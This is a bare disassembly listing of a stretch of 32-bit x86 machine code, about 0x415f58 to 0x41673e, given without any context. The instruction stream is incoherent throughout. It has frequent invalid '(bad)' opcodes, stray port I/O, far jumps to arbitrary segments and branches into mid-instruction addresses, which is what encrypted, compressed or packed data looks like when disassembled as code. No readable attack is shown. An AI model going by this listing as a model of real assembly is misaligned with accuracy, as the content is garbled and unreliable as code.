  415f58:	sbb    eax,0xcbcc0a7b
  415f5d:	or     eax,0x64855bb8
  415f62:	and    ch,BYTE PTR [edi+0x1fc7954d]
  415f68:	loope  0x415fc4
  415f6a:	(bad)  
  415f6b:	out    0x72,eax
  415f6d:	ins    DWORD PTR es:[edi],dx
  415f6e:	fimul  WORD PTR [edx+0x60]
  415f71:	lea    edx,[edx-0x52]
  415f74:	into   
  415f75:	call   0x916c04bc
  415f7a:	imul   edx,DWORD PTR [esi-0x4d6034a8],0x34277f07
  415f84:	ja     0x415f1e
  415f86:	ins    DWORD PTR es:[edi],dx
  415f87:	xchg   ebp,eax
  415f88:	ret    0xd622
  415f8b:	bt     DWORD PTR [edi],ecx
  415f8e:	in     al,dx
  415f8f:	repnz inc esi
  415f91:	and    eax,0xa6aad8de
  415f96:	pop    ebp
  415f97:	fist   WORD PTR [edi]
  415f99:	in     al,dx
  415f9a:	pop    edi
  415f9b:	push   cs
  415f9c:	cmp    BYTE PTR [ebx-0x41],bl
  415f9f:	dec    ebp
  415fa0:	adc    al,0xfa
  415fa2:	ja     0x415f89
  415fa4:	xor    BYTE PTR [esi-0x5522e4a5],bh
  415faa:	adc    ah,cl
  415fac:	sub    esi,DWORD PTR [esi+0x1b328b9b]
  415fb2:	call   0xec9fe083
  415fb7:	push   ebp
  415fb8:	mov    edi,0x3f79d25a
  415fbd:	mov    al,ds:0x254e0f36
  415fc2:	scas   al,BYTE PTR es:[edi]
  415fc3:	mov    cl,0xa5
  415fc5:	cli    
  415fc6:	sub    eax,0x5075c8ac
  415fcb:	cli    
  415fcc:	push   es
  415fcd:	in     al,0xe6
  415fcf:	xchg   esp,eax
  415fd0:	fnsave ds:0xfe869098
  415fd6:	mov    dh,0x9b
  415fd8:	jecxz  0x416047
  415fda:	mov    esp,DWORD PTR [ebx]
  415fdc:	loope  0x415fac
  415fde:	in     al,dx
  415fdf:	dec    esp
  415fe0:	xchg   DWORD PTR [ebp+esi*1+0x16],ebx
  415fe4:	shl    DWORD PTR [esi-0xb60f134],0x94
  415feb:	push   edi
  415fec:	out    dx,al
  415fed:	aaa    
  415fee:	cmp    al,0x62
  415ff0:	(bad)  
  415ff1:	or     esi,DWORD PTR [edi]
  415ff3:	out    dx,eax
  415ff4:	mov    ch,BYTE PTR [ebx+ebx*8]
  415ff7:	sbb    eax,0xa73870c9
  415ffc:	inc    esi
  415ffd:	cmc    
  415ffe:	inc    esp
  415fff:	mov    edi,0x6534df62
  416004:	(bad)  
  416005:	push   edi
  416006:	add    edi,DWORD PTR [eax-0x1c6bd741]
  41600c:	mov    ds:0x4d9b0594,al
  416011:	push   ecx
  416012:	jg     0x415fe3
  416014:	mov    bl,BYTE PTR [edx-0x54fa1b01]
  41601a:	int3   
  41601b:	push   cs
  41601c:	imul   ebp,DWORD PTR [ecx],0xb8b538cb
  416022:	shr    BYTE PTR [edx],cl
  416024:	pop    ds
  416025:	cmp    al,0x19
  416027:	jecxz  0x416024
  416029:	cmp    eax,0xe1a1bd85
  41602e:	pop    edx
  41602f:	lock add al,0x9d
  416032:	dec    eax
  416033:	add    DWORD PTR [edx+0x9],0xa543da4c
  41603a:	arpl   WORD PTR [esi-0x538ffc04],dx
  416040:	mov    ebx,0x875279d
  416045:	push   edx
  416046:	scas   eax,DWORD PTR es:[edi]
  416047:	out    0xef,al
  416049:	pop    ebx
  41604a:	fsub   DWORD PTR [edi]
  41604c:	fidivr WORD PTR [ebx]
  41604e:	mov    dh,0x47
  416050:	or     BYTE PTR [ebp+esi*4-0x2d184f58],0x84
  416058:	sbb    bl,ah
  41605a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41605b:	sub    DWORD PTR [esi],ebx
  41605d:	and    al,0xfe
  41605f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416060:	xor    eax,0xa544c754
  416065:	aad    0x14
  416067:	dec    eax
  416068:	mov    dh,0x87
  41606a:	mov    BYTE PTR [esi+0x41503a30],dh
  416070:	sar    DWORD PTR [ebx-0x38885107],1
  416076:	xchg   esi,eax
  416077:	mov    ah,0xd5
  416079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41607a:	mov    eax,0x36d7c046
  41607f:	pop    es
  416080:	mov    ds:0xb155c397,eax
  416085:	fld    DWORD PTR [ebx]
  416087:	mov    bh,0x50
  416089:	sbb    DWORD PTR [ecx],edi
  41608b:	push   esp
  41608c:	fxch   st(5)
  41608e:	test   eax,0x70211d33
  416093:	leave  
  416094:	fdiv   st(7),st
  416096:	rol    BYTE PTR [eax-0x9],1
  416099:	jmp    0x4160e7
  41609b:	loopne 0x4160b7
  41609d:	ins    BYTE PTR es:[edi],dx
  41609e:	test   BYTE PTR [edx+0x4ab9a0e5],al
  4160a4:	mov    DWORD PTR [eax-0x4e371c52],esi
  4160aa:	push   ebx
  4160ab:	xchg   esp,eax
  4160ac:	push   ds
  4160ad:	std    
  4160ae:	mov    bh,0xe6
  4160b0:	pop    edx
  4160b1:	cmp    BYTE PTR [edx],dl
  4160b3:	mov    esp,0x9f685f3f
  4160b8:	hlt    
  4160b9:	shl    DWORD PTR [edi],cl
  4160bb:	sub    eax,0x8a834dea
  4160c0:	pop    ebx
  4160c1:	das    
  4160c2:	lea    esi,[ecx]
  4160c4:	mov    eax,ds:0x8c297f87
  4160c9:	lods   al,BYTE PTR ds:[esi]
  4160ca:	cmp    edi,DWORD PTR [ebx-0x3114bd10]
  4160d0:	pop    esp
  4160d1:	sbb    eax,eax
  4160d3:	sub    bl,BYTE PTR [edx+0x1b]
  4160d6:	fmulp  st(5),st
  4160d8:	iret   
  4160d9:	xor    esp,DWORD PTR [eax+0x2f461ef]
  4160df:	pop    edx
  4160e0:	inc    esp
  4160e1:	lea    edx,[ecx+esi*2+0x5bd52ab0]
  4160e8:	pop    ebp
  4160e9:	add    esp,ebx
  4160eb:	adc    DWORD PTR [edi+0x7dd484c3],eax
  4160f1:	es ret 
  4160f3:	jnp    0x41616a
  4160f5:	rcl    BYTE PTR [ebx-0x590e9aa3],0xab
  4160fc:	mov    ebx,0x7bf85d6a
  416101:	add    BYTE PTR [edx-0x62c87e61],0xfe
  416108:	cwde   
  416109:	popa   
  41610a:	addr16 lahf 
  41610c:	adc    eax,0xf8b01ff6
  416111:	in     eax,0x18
  416113:	xor    edx,0x83fa4dc7
  416119:	(bad)  
  41611a:	fwait
  41611b:	xchg   dl,cl
  41611d:	sub    BYTE PTR [esi-0x17b088f5],cl
  416123:	daa    
  416124:	push   ebx
  416125:	out    dx,al
  416126:	dec    esp
  416127:	jb     0x4160d2
  416129:	inc    edi
  41612a:	sub    edx,DWORD PTR [esi+0x3a]
  41612d:	outs   dx,DWORD PTR ds:[esi]
  41612e:	mov    BYTE PTR [ecx+edi*2-0x2c],dh
  416132:	sar    DWORD PTR [ecx+0x4c57c007],0x20
  416139:	push   ss
  41613a:	push   ecx
  41613b:	repz cmp eax,0x224c0623
  416141:	push   ebp
  416142:	push   ss
  416143:	cmp    al,0x3d
  416145:	lock pushf 
  416147:	loopne 0x416149
  416149:	dec    ecx
  41614a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41614b:	pushf  
  41614c:	push   ss
  41614d:	or     eax,0x48b66feb
  416152:	not    dh
  416154:	ins    DWORD PTR es:[edi],dx
  416155:	push   cs
  416156:	cmp    BYTE PTR [esi-0x4023e6d1],cl
  41615c:	pusha  
  41615d:	add    DWORD PTR [ebx+0x22],esp
  416160:	sub    eax,DWORD PTR [esi-0x49edfedc]
  416166:	jle    0x416116
  416168:	scas   al,BYTE PTR es:[edi]
  416169:	push   edx
  41616a:	push   es
  41616b:	mov    ds:0x86422cb,eax
  416170:	cs cli 
  416172:	add    al,0xa7
  416174:	and    ebx,ebp
  416176:	shl    DWORD PTR [ebx],cl
  416178:	in     al,dx
  416179:	popf   
  41617a:	fimul  WORD PTR [esp+eax*4+0x13]
  41617e:	xchg   esi,eax
  41617f:	mov    al,0x7
  416181:	mul    dl
  416183:	or     eax,0x147c90b5
  416188:	push   esi
  416189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41618a:	fwait
  41618b:	test   esp,ebp
  41618d:	push   ecx
  41618e:	pop    ecx
  41618f:	sar    ah,cl
  416191:	out    dx,al
  416192:	and    edi,DWORD PTR [ecx+0xd]
  416195:	sub    ebp,DWORD PTR [esi-0x41640b86]
  41619b:	sub    ebx,ebp
  41619d:	das    
  41619e:	mov    ebx,0x3c89f2c3
  4161a3:	pusha  
  4161a4:	lahf   
  4161a5:	popa   
  4161a6:	outs   dx,DWORD PTR ds:[esi]
  4161a7:	retf   
  4161a8:	jmp    0x88ea:0xa5773180
  4161af:	push   ebx
  4161b0:	mov    dh,0x27
  4161b2:	rcl    BYTE PTR [ebx],0x53
  4161b5:	std    
  4161b6:	sbb    BYTE PTR [edi],cl
  4161b8:	pop    ds
  4161b9:	cmp    eax,DWORD PTR [edi+0x2b8e94aa]
  4161bf:	mov    bl,0x95
  4161c1:	cmc    
  4161c2:	stos   BYTE PTR es:[edi],al
  4161c3:	mov    ecx,0x592d29b3
  4161c8:	daa    
  4161c9:	cmp    BYTE PTR [ebx-0x6f2c095f],al
  4161cf:	mov    ebx,DWORD PTR [eax+edx*1]
  4161d2:	push   ebx
  4161d3:	hlt    
  4161d4:	sub    al,0x8f
  4161d6:	jmp    0x7c4f:0xbd3ef090
  4161dd:	outs   dx,DWORD PTR ds:[esi]
  4161de:	inc    esp
  4161df:	mov    al,ds:0xb8d459a3
  4161e4:	mov    ebp,0x1b89a096
  4161e9:	xchg   DWORD PTR [edx],ecx
  4161eb:	sub    edi,DWORD PTR [edx]
  4161ed:	adc    eax,0x2dfff6b2
  4161f2:	int3   
  4161f3:	(bad)  
  4161f5:	bound  esi,QWORD PTR [esp+ecx*1-0x62e9e284]
  4161fc:	pushf  
  4161fd:	add    eax,0x31606c9e
  416202:	push   edi
  416203:	jno    0x4161ce
  416205:	jne    0x416224
  416207:	out    0x89,al
  416209:	and    DWORD PTR [ecx+0x75c4219a],ebp
  41620f:	mov    dh,0x4e
  416211:	or     DWORD PTR [edx+0x73],esp
  416214:	ss dec esi
  416216:	dec    esi
  416217:	fistp  QWORD PTR ds:[eax]
  41621a:	mul    BYTE PTR [ebx+edi*8]
  41621d:	pop    ebx
  41621e:	mov    al,bl
  416220:	mov    ah,0x2e
  416222:	mov    esp,0x2f07db16
  416227:	or     DWORD PTR ds:0xfc83abea,eax
  41622d:	xchg   ebp,eax
  41622e:	in     al,dx
  41622f:	sub    edx,DWORD PTR [edx]
  416231:	sub    esi,eax
  416233:	mov    bh,0x73
  416235:	mov    al,ds:0x6774f400
  41623a:	aaa    
  41623b:	inc    esi
  41623c:	push   0xffffffec
  41623e:	(bad)  
  41623f:	in     al,0xf1
  416241:	pop    ebp
  416242:	add    bl,BYTE PTR [edx-0x78]
  416245:	sbb    ebx,DWORD PTR [edx]
  416247:	or     al,0xa7
  416249:	mov    DWORD PTR [eax],esi
  41624b:	lock (bad) 
  41624d:	outs   dx,DWORD PTR ds:[esi]
  41624e:	sub    al,0x9a
  416250:	mov    al,ds:0xc276b65e
  416255:	push   eax
  416256:	das    
  416257:	pop    edx
  416258:	mov    ebx,0x1a8bd696
  41625d:	cwde   
  41625e:	push   esi
  41625f:	mov    cl,0x70
  416261:	pop    eax
  416262:	add    eax,DWORD PTR [edx-0x26]
  416265:	in     al,dx
  416266:	or     al,0xf
  416268:	popf   
  416269:	lea    edx,[edi]
  41626b:	push   ebp
  41626c:	jbe    0x4162a9
  41626e:	rcr    BYTE PTR gs:[ebx+0x78],cl
  416272:	inc    edx
  416273:	xchg   esi,eax
  416274:	loopne 0x416205
  416276:	cmp    ebp,0xffffffdf
  416279:	mov    al,0x5a
  41627b:	cdq    
  41627c:	sti    
  41627d:	fninit 
  41627f:	pop    ebp
  416280:	pop    edx
  416281:	mov    ah,0xca
  416283:	int3   
  416284:	push   ds
  416285:	ins    BYTE PTR es:[edi],dx
  416286:	loopne 0x4162ad
  416288:	adc    edx,esp
  41628a:	cs mov edi,0x5ccfa677
  416290:	cmc    
  416291:	and    eax,0x4d39d4f8
  416296:	push   edi
  416297:	nop
  416298:	add    BYTE PTR [edi+0x2d],al
  41629b:	xor    BYTE PTR [edi-0x35],cl
  41629e:	cli    
  41629f:	mov    dl,0x11
  4162a1:	sti    
  4162a2:	and    al,0xc1
  4162a4:	xor    eax,0x8ea9d9fe
  4162a9:	mov    edx,0x5841b736
  4162ae:	(bad)  
  4162af:	ror    cl,cl
  4162b1:	in     eax,0x96
  4162b3:	(bad)  
  4162b4:	cmp    edi,DWORD PTR [edi-0x47893c06]
  4162ba:	and    dh,dh
  4162bc:	mov    WORD PTR [ecx-0x157bdc9a],fs
  4162c2:	sub    bh,BYTE PTR [ebp-0x64d7373f]
  4162c8:	push   esi
  4162c9:	mov    ?,WORD PTR [ecx+0x58518651]
  4162cf:	add    bl,BYTE PTR [ebx-0x40]
  4162d2:	(bad)  
  4162d5:	inc    eax
  4162d6:	ja     0x4162a4
  4162d8:	add    edx,edi
  4162da:	stc    
  4162db:	mov    esi,0xae5ef704
  4162e0:	leave  
  4162e1:	ror    DWORD PTR [ebx+0xa],1
  4162e4:	mov    eax,fs
  4162e6:	sbb    dl,BYTE PTR [eax]
  4162e8:	sub    edi,DWORD PTR [ebp-0x79]
  4162eb:	dec    esp
  4162ec:	cs ins BYTE PTR es:[edi],dx
  4162ee:	gs sub al,dh
  4162f1:	imul   eax,DWORD PTR [ecx],0x8dcbd1c
  4162f7:	out    dx,eax
  4162f8:	adc    eax,0xcff9a2a0
  4162fd:	inc    ebx
  4162fe:	xchg   esp,eax
  4162ff:	daa    
  416300:	jp     0x4162a0
  416302:	(bad)  ds:0x106a1b55
  416308:	pop    ss
  416309:	xchg   ch,bh
  41630b:	sub    ah,BYTE PTR [esi+0x8]
  41630e:	and    eax,0x8564c229
  416313:	sbb    al,0xa9
  416315:	sbb    esi,DWORD PTR [edx-0x6bf15975]
  41631b:	iret   
  41631c:	loop   0x4162a9
  41631e:	js     0x416371
  416320:	sub    DWORD PTR [edi+eiz*1-0xb37c1f6],eax
  416327:	lods   eax,DWORD PTR ds:[esi]
  416328:	cmc    
  416329:	(bad)  
  41632a:	mov    bl,0x23
  41632c:	stc    
  41632d:	fisub  WORD PTR ds:0x7f084b37
  416333:	aad    0x1e
  416335:	or     cl,BYTE PTR [edx+edx*1+0x5d]
  416339:	shl    DWORD PTR [ebp-0x40d38af3],0x7b
  416340:	ss jl  0x41637e
  416343:	mov    edx,0xf1c823b1
  416348:	inc    esp
  416349:	nop
  41634a:	mov    al,ds:0x24e1da09
  41634f:	(bad)  
  416350:	pop    ebx
  416351:	cwde   
  416352:	retf   0x6a69
  416355:	mov    eax,ds:0xb2aef542
  41635a:	xor    ah,BYTE PTR [ebx+0x4088e51b]
  416360:	mov    ecx,0xba23155d
  416365:	xchg   edx,eax
  416366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416367:	ret    
  416368:	mov    ebp,0x6e564c85
  41636d:	cmp    dh,0x4f
  416370:	xchg   edi,eax
  416371:	bound  esi,QWORD PTR [esi+ebp*2+0x66]
  416375:	jp     0x416397
  416377:	pop    ebp
  416378:	push   ebx
  416379:	jmp    0xc8823b79
  41637e:	mov    esp,0xc1ff7e9d
  416383:	ret    
  416384:	stos   DWORD PTR es:[edi],eax
  416385:	loopne 0x4163af
  416387:	cmp    ah,BYTE PTR [eax]
  416389:	arpl   WORD PTR [ecx],bp
  41638b:	shr    DWORD PTR [ecx+0xc],cl
  41638e:	mov    cl,0x2e
  416390:	xor    DWORD PTR [ebx-0x5f],edi
  416393:	out    0xfd,eax
  416395:	scas   al,BYTE PTR es:[edi]
  416396:	out    dx,eax
  416397:	push   eax
  416398:	push   0xffffffc2
  41639a:	in     eax,dx
  41639b:	sub    BYTE PTR [ecx-0x18],dh
  41639e:	sub    BYTE PTR [eax],dl
  4163a0:	inc    bp
  4163a2:	retf   0x74eb
  4163a5:	cmp    bl,BYTE PTR [edi-0x53]
  4163a8:	shr    DWORD PTR [ecx-0x41211524],cl
  4163ae:	mov    ebp,0xcd7b0c85
  4163b3:	pushf  
  4163b4:	sub    al,BYTE PTR [ecx+0x4c]
  4163b7:	pop    esi
  4163b8:	inc    ebx
  4163b9:	es pusha 
  4163bb:	jg     0x416438
  4163bd:	ins    DWORD PTR es:[edi],dx
  4163be:	std    
  4163bf:	jecxz  0x4163c2
  4163c1:	adc    al,0xb1
  4163c3:	push   ss
  4163c4:	fstp   TBYTE PTR [eax]
  4163c6:	mov    ecx,DWORD PTR [edi]
  4163c8:	arpl   WORD PTR ds:0x81c3ba13,bx
  4163ce:	ror    al,cl
  4163d0:	pop    ebp
  4163d1:	jae    0x41644d
  4163d3:	pop    ss
  4163d4:	pop    es
  4163d5:	mov    ch,0x77
  4163d7:	std    
  4163d8:	in     al,dx
  4163d9:	inc    eax
  4163da:	leave  
  4163db:	pop    eax
  4163dc:	(bad)
  4163df:	daa    
  4163e0:	jp     0x416384
  4163e2:	xchg   ecx,eax
  4163e3:	(bad)  
  4163e4:	jne    0x41639c
  4163e6:	add    eax,ebp
  4163e8:	ret    0x415b
  4163eb:	repnz mov ds:0xd9a05cc4,eax
  4163f1:	sbb    BYTE PTR [edx],al
  4163f3:	fisttp WORD PTR [esi-0x1da4467a]
  4163f9:	xor    al,0x51
  4163fb:	pop    edx
  4163fc:	test   BYTE PTR [edx-0x4e345aac],bl
  416402:	inc    esi
  416403:	sbb    edx,DWORD PTR [ecx+edx*1]
  416406:	jge    0x4163b4
  416408:	mov    al,0x3c
  41640a:	stos   DWORD PTR es:[edi],eax
  41640b:	push   dx
  41640d:	jb     0x41646c
  41640f:	cwde   
  416410:	test   al,0xb8
  416412:	(bad)  
  416413:	mul    BYTE PTR [esi+0x41b15708]
  416419:	loope  0x416488
  41641b:	es inc edi
  41641d:	pop    eax
  41641e:	xchg   ebp,eax
  41641f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416420:	call   0x8e0b969e
  416425:	gs inc ebx
  416427:	bound  edx,QWORD PTR [ebx+0xee3bb46]
  41642d:	clc    
  41642e:	lds    ebx,FWORD PTR [eax]
  416430:	fwait
  416431:	fs clc 
  416433:	pop    ebp
  416434:	daa    
  416435:	test   BYTE PTR [eax],bh
  416437:	xchg   esp,eax
  416438:	mov    eax,ds:0x25f2ee0
  41643d:	dec    esi
  41643e:	out    0x69,eax
  416440:	cs push edx
  416442:	in     eax,dx
  416443:	ficomp DWORD PTR ds:[esi+0x6c]
  416447:	pop    ebx
  416448:	push   ebx
  416449:	ins    BYTE PTR es:[edi],dx
  41644a:	ret    
  41644b:	mov    cl,0xbd
  41644d:	sub    BYTE PTR [ebx+0x3a],ah
  416450:	xchg   esi,eax
  416451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416452:	cli    
  416453:	xor    ecx,DWORD PTR [ecx]
  416455:	call   0x369e:0xc84040f7
  41645c:	and    al,0x5a
  41645e:	ret    
  41645f:	ret    0xdb16
  416462:	shl    BYTE PTR [edx+0x11],0xb7
  416466:	stos   BYTE PTR es:[edi],al
  416467:	(bad)  [esi]
  416469:	inc    eax
  41646a:	and    al,0x57
  41646c:	dec    edx
  41646d:	mov    cl,0xbc
  41646f:	add    ecx,DWORD PTR [ebp+0x62028f5]
  416475:	aas    
  416476:	and    al,0xa3
  416478:	mov    al,0x89
  41647a:	xor    eax,0x72ec4924
  41647f:	jo     0x416480
  416481:	sahf   
  416482:	mov    ecx,0xffe946e9
  416487:	mov    WORD PTR [eax+0x7f],es
  41648a:	sub    BYTE PTR [eax],0x8d
  41648d:	add    al,0xa2
  41648f:	rcl    DWORD PTR [esi*2+0x7f1afc2f],0x4b
  416497:	syscall 
  416499:	mov    edx,0xb519b08c
  41649e:	dec    ebp
  41649f:	push   esi
  4164a0:	adc    al,0xc0
  4164a2:	inc    esp
  4164a3:	(bad)  
  4164a4:	cs and al,0x81
  4164a7:	sti    
  4164a8:	bound  ebp,QWORD PTR [ecx-0x5e]
  4164ab:	mov    ds:0xbc782dde,al
  4164b0:	adc    ah,BYTE PTR ds:0xd5cece65
  4164b6:	pop    ecx
  4164b7:	push   ebp
  4164b8:	sar    BYTE PTR [edx+0x2b],0x4e
  4164bc:	xchg   esi,eax
  4164bd:	adc    eax,0x3ba82201
  4164c2:	pop    edx
  4164c3:	jns    0x416447
  4164c5:	jnp    0x4164e2
  4164c7:	pusha  
  4164c8:	lea    ecx,[ecx+0x53]
  4164cb:	and    al,0xe3
  4164cd:	ror    BYTE PTR [eax],cl
  4164cf:	aaa    
  4164d0:	sahf   
  4164d1:	inc    esi
  4164d2:	cwde   
  4164d3:	push   esp
  4164d4:	jbe    0x4164bb
  4164d6:	push   ss
  4164d7:	mov    DWORD PTR [ecx+edx*2+0x7d],ecx
  4164db:	add    BYTE PTR [edx],ah
  4164dd:	addr16 and al,0x30
  4164e0:	dec    ecx
  4164e1:	push   ecx
  4164e2:	imul   BYTE PTR [ebx]
  4164e4:	inc    ebx
  4164e5:	dec    ebp
  4164e6:	or     BYTE PTR [esi+0x34821a77],dl
  4164ec:	mov    ecx,0xa3e34f7f
  4164f1:	dec    ebp
  4164f2:	das    
  4164f3:	ret    0xe31a
  4164f6:	push   ebx
  4164f7:	jae    0x416498
  4164f9:	mov    BYTE PTR [edi-0x1ed72871],ch
  4164ff:	retf   0x1c8
  416502:	adc    BYTE PTR [ebx+0x5a],dh
  416505:	stc    
  416506:	rol    BYTE PTR [ebx+0x28f26555],cl
  41650c:	xchg   edx,eax
  41650d:	call   0x8923:0xa6336a67
  416514:	xor    BYTE PTR [esi-0x43],dh
  416517:	or     al,al
  416519:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41651a:	fldcw  WORD PTR [ebp+0x12a1d302]
  416520:	call   0xd23f:0x648a6265
  416527:	adc    BYTE PTR [esi+edx*1-0x63],dh
  41652b:	xor    eax,0x795d6a22
  416530:	out    0x9f,al
  416532:	int    0x9a
  416534:	jle    0x41656f
  416536:	dec    eax
  416537:	adc    edx,DWORD PTR [edi-0x399650eb]
  41653d:	pop    ebp
  41653e:	xor    edx,esp
  416540:	inc    esp
  416541:	cmp    esp,DWORD PTR [edi]
  416543:	(bad)  
  416544:	mov    ebp,0xfffeff1a
  416549:	out    0xbd,eax
  41654b:	lods   eax,DWORD PTR ds:[esi]
  41654c:	ret    0x4445
  41654f:	ficomp WORD PTR [esp+edi*8+0x6ce8d0e9]
  416556:	outs   dx,BYTE PTR ds:[esi]
  416557:	sti    
  416558:	mov    edx,0x8efe3ef0
  41655d:	jno    0x416590
  41655f:	push   0x87fde263
  416564:	cmp    eax,DWORD PTR [di+0x69b9]
  416569:	ja     0x416538
  41656b:	ret    
  41656c:	shl    ch,0xcc
  41656f:	out    dx,al
  416570:	lods   al,BYTE PTR ds:[esi]
  416571:	add    BYTE PTR [ebx+0x12],0x3b
  416575:	cli    
  416576:	aas    
  416577:	fld    QWORD PTR fs:[eax-0x31911a4a]
  41657e:	jnp    0x41656f
  416580:	pop    edx
  416581:	push   edx
  416582:	into   
  416583:	test   ch,0x3b
  416586:	das    
  416587:	jbe    0x41652c
  416589:	xlat   BYTE PTR ds:[ebx]
  41658a:	es or  eax,0x43
  41658e:	mov    fs,WORD PTR ds:0xeefd2104
  416594:	cmp    ah,BYTE PTR [edi-0x213e7eba]
  41659a:	dec    esi
  41659b:	jl     0x416568
  41659d:	enter  0x37a8,0x16
  4165a1:	or     BYTE PTR [esi+ebp*8+0x71],al
  4165a5:	imul   ebx,DWORD PTR [ebp-0x5f],0xc5f24aa0
  4165ac:	lods   eax,DWORD PTR ds:[esi]
  4165ad:	inc    eax
  4165ae:	mov    ah,0xff
  4165b0:	pop    esp
  4165b1:	xor    bh,BYTE PTR [ebx]
  4165b3:	retf   0x1f69
  4165b6:	ficomp DWORD PTR [edi+0x42ed40b3]
  4165bc:	inc    edx
  4165bd:	sti    
  4165be:	aad    0x82
  4165c0:	xor    DWORD PTR [eax+0x4a],edx
  4165c3:	fwait
  4165c4:	loope  0x41655e
  4165c6:	push   0x73
  4165c8:	in     eax,dx
  4165c9:	pop    eax
  4165ca:	sub    BYTE PTR [esi+edx*4-0x64],ah
  4165ce:	ss inc esi
  4165d0:	sub    al,0xea
  4165d2:	test   BYTE PTR [ebp+0x46],dl
  4165d5:	call   0x617f:0x893c60fa
  4165dc:	nop
  4165dd:	loope  0x41661d
  4165df:	add    edi,DWORD PTR [edx-0x35]
  4165e2:	test   eax,0xafc82298
  4165e7:	pop    esp
  4165e8:	jnp    0x416615
  4165ea:	jge    0x416623
  4165ec:	es jmp 0xc8b71fbf
  4165f2:	ins    DWORD PTR es:[edi],dx
  4165f3:	arpl   WORD PTR [edi+0x67],ax
  4165f6:	adc    dl,BYTE PTR [ebp+0x76]
  4165f9:	xchg   DWORD PTR ds:0xc997f4f6,ebx
  4165ff:	inc    ecx
  416600:	dec    edx
  416601:	jo     0x41667e
  416603:	push   esi
  416604:	mov    edx,0xd34c382a
  416609:	pop    es
  41660a:	mov    ebx,DWORD PTR [ebx+0x205c69bf]
  416610:	add    cl,BYTE PTR gs:[ecx]
  416613:	and    bh,ch
  416615:	or     bl,BYTE PTR [esi+0x1c]
  416618:	adc    BYTE PTR [edx-0x3c],dh
  41661b:	pop    esp
  41661c:	sub    esi,DWORD PTR [ebx]
  41661e:	sub    esi,DWORD PTR [edx]
  416620:	jmp    0x41663f
  416622:	shl    DWORD PTR [edi+0x7],0x99
  416626:	push   ebx
  416627:	(bad)  
  416629:	inc    eax
  41662a:	or     BYTE PTR [edi-0x31],al
  41662d:	pop    eax
  41662e:	cmp    BYTE PTR [ebp+eiz*2+0xf],al
  416632:	xchg   edi,eax
  416633:	and    esp,DWORD PTR [ebp+0x5a]
  416636:	cmp    cl,BYTE PTR [eax+ecx*4]
  416639:	js     0x4166b0
  41663b:	(bad)  
  41663c:	fisubr DWORD PTR [eax+0x23229d8f]
  416642:	mov    esi,?
  416644:	and    ebp,ebx
  416646:	sub    DWORD PTR [edi],ebp
  416648:	cmp    eax,DWORD PTR ds:0x19b14451
  41664e:	ds push 0x52
  416651:	fwait
  416652:	mov    ss,WORD PTR [eax]
  416654:	push   edi
  416655:	mov    cl,0xbc
  416657:	jae    0x416698
  416659:	cmp    eax,0xd92a992f
  41665e:	leave  
  41665f:	adc    DWORD PTR [ebp+0x66403e7a],ecx
  416665:	jb     0x4165ec
  416667:	test   al,0x74
  416669:	dec    eax
  41666a:	daa    
  41666b:	test   al,0xc0
  41666d:	push   eax
  41666e:	inc    eax
  41666f:	ss data16 cli 
  416672:	mov    eax,0x3a728019
  416677:	fldcw  WORD PTR [edx-0x300bf76a]
  41667d:	push   0xe3969ff2
  416682:	es and ebp,eax
  416685:	mov    dl,ch
  416687:	sbb    edx,eax
  416689:	iret   
  41668a:	sti    
  41668b:	outs   dx,DWORD PTR ds:[esi]
  41668c:	sbb    esp,esi
  41668e:	dec    edx
  41668f:	mov    BYTE PTR [ebx+0x3e899221],dl
  416695:	xchg   esi,eax
  416696:	into   
  416697:	add    esp,ebp
  416699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41669a:	es xchg edi,eax
  41669c:	xchg   DWORD PTR [edi-0x540cbdae],ebp
  4166a2:	arpl   WORD PTR [ebp+0x45d3aef6],bx
  4166a8:	jnp    0x416646
  4166aa:	inc    ecx
  4166ab:	mov    edx,0xa08c0110
  4166b0:	das    
  4166b1:	out    dx,al
  4166b2:	xchg   DWORD PTR [ebx-0x5e],ecx
  4166b5:	mov    esp,0x204c3e7e
  4166ba:	out    0x1f,eax
  4166bc:	mov    bl,0xd2
  4166be:	outs   dx,BYTE PTR ds:[esi]
  4166bf:	jl     0x4166c2
  4166c1:	add    ecx,DWORD PTR [edx-0x53]
  4166c4:	pop    ecx
  4166c5:	mov    ds,WORD PTR [esi+ecx*1]
  4166c8:	les    ebp,FWORD PTR [ebx-0x1f]
  4166cb:	out    dx,eax
  4166cc:	(bad)  
  4166cd:	fs pop es
  4166cf:	add    BYTE PTR [eax+0x3600278c],dl
  4166d5:	loope  0x41673e
  4166d7:	push   ecx
  4166d8:	imul   ecx,DWORD PTR [ebx-0x635b1185],0x61d57f0
  4166e2:	rcl    DWORD PTR [edi],1
  4166e4:	inc    ebx
  4166e5:	sbb    al,dh
  4166e7:	out    0x67,al
  4166e9:	iret   
  4166ea:	or     eax,DWORD PTR [ebx+0xc587628]
  4166f0:	mov    dl,0x0
  4166f2:	push   eax
  4166f3:	iret   
  4166f4:	or     ah,BYTE PTR [ebx+0x53]
  4166f7:	xchg   ebx,eax
  4166f8:	inc    eax
  4166f9:	in     al,0xfc
  4166fb:	add    al,0x7
  4166fd:	or     bl,BYTE PTR [edi]
  4166ff:	test   DWORD PTR [edx-0x4058a2c9],0x69a8d70d
  416709:	xlat   BYTE PTR ds:[ebx]
  41670a:	mov    dl,0x22
  41670c:	cmp    esi,edi
  41670e:	into   
  41670f:	mov    cl,0xce
  416711:	jl     0xae107c2b
  416717:	mov    BYTE PTR [ebx],al
  416719:	jae    0x416766
  41671b:	adc    cl,BYTE PTR [edx-0x2dd667ee]
  416721:	sub    BYTE PTR [ebx+0x5c7c4191],bl
  416727:	jne    0x4166e8
  416729:	add    eax,0x1fdc0f05
  41672e:	data16 in al,dx
  416730:	push   esp
  416731:	ret    0x397f
  416734:	fs xchg esi,eax
  416736:	jg     0x4166b8
  416738:	bound  edx,QWORD PTR [ebp+0x3a]
  41673b:	into   
  41673c:	in     eax,dx
  41673d:	dec    eax
  41673e:	mov    ebp,DWORD PTR [esi]
